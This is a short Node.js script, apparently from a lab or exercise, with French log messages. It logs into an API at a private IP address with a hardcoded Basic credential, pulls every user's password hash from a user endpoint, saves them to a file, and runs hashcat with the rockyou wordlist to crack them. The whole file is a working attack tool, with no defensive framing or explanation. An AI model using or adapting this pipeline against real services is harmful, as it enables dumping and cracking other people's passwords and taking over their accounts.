import fetch, { Headers } from 'node-fetch';
import fs from 'fs';
import { exec } from 'child_process';

const fetchToken = async () => {
    const myHeaders1 = new Headers();
    myHeaders1.append("Authorization", "Basic Y2FjYUBnbWFpbC5jb206cGFzc3dvcmQ=");

    const requestOptions1 = {
        method: "GET",
        headers: myHeaders1,
        redirect: "follow"
    };

    try {
        const response = await fetch("http://10.104.131.174:8080/auth/token", requestOptions1);
        const result = await response.text();
        return JSON.parse(result).token;
    } catch (error) {
        console.error('Erreur lors de la récupération du token:', error);
        throw error;
    }
};

const fetchUsers = async (token) => {
    const myHeaders2 = new Headers();
    myHeaders2.append("Authorization", `Bearer ${token}`);

    const requestOptions2 = {
        method: "GET",
        headers: myHeaders2,
        redirect: "follow"
    };

    try {
        const response = await fetch("http://10.104.131.174:8080/user", requestOptions2);
        return await response.json();
    } catch (error) {
        console.error('Erreur lors de la récupération des informations des utilisateurs:', error);
        throw error;
    }
};

const crackPasswords = (hashFile, resultFile) => {
    return new Promise((resolve, reject) => {
        const command = `hashcat -m 100 -a 0 ${hashFile} SecLists/Passwords/Leaked-Databases/rockyou/rockyou.txt --outfile ${resultFile}`;
        exec(command, (error, stdout, stderr) => {
            if (error) {
                console.error('Erreur lors du craquage des mots de passe:', error);
                reject(error);
            } else {
                console.log('Craquage des mots de passe terminé');
                resolve(stdout);
            }
        });
    });
};

const main = async () => {
    try {
        const token = await fetchToken();
        const users = await fetchUsers(token);

        const hashes = users.map(user => user.password);

        console.log("Hashes:", hashes);

        const hashFile = 'hashes.txt';
        const resultFile = 'resultats_hash.txt';

        fs.writeFileSync(hashFile, hashes.join('\n'));

        console.log(`Les hachages ont été sauvegardés dans '${hashFile}'`);

        await crackPasswords(hashFile, resultFile);

        console.log(`Les résultats ont été sauvegardés dans '${resultFile}'`);
    } catch (error) {
        console.error('Une erreur est survenue:', error);
    }
};

main();